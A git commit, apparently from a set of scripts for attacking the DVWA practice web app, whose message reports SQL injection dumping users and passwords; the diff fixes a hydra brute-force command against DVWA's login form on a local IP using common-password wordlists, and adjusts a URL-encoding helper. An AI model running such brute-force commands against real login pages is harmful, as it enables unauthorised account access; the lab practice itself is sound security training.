6aa767c9189d7507d11f648826e8714d8c35740c
C0nsultant <anokfireball@posteo.de>
2016-03-17 20:48:42 +0100

    SQL Injection - low: got users and passwords (both SQL & UNIX ones)

--- 1_login/1_login_low.sh
+++ 1_login/1_login_low.sh
@@ -6,6 +6,6 @@ source ../levelled_login.sh low
 curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/brute/ > /dev/null
 #Send our known login
 rm hydra.restore
-hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -Vv -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: security=${LEVEL}; PHPSESSID=${SESSIONID}"
+hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -Vv -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: security=${SECURITY}; PHPSESSID=${SESSIONID}"
 unset LEVEL
 unset SESSIONID
--- rawurlencode.sh
+++ rawurlencode.sh
@@ -6,8 +6,9 @@ for (( pos=0 ; pos<strlen ; pos++ )); do
   c=${string:$pos:1}
   case "$c" in
     [-_.~a-zA-Z0-9] ) o="${c}" ;;
-    * )               printf -v o '%%%02x' "'$c"
-  esac
+    " " ) o="+" ;;
+    * ) printf -v o '%%%02x' "'$c"
+   esac
   encoded+="${o}"
 done
 echo "${encoded}"
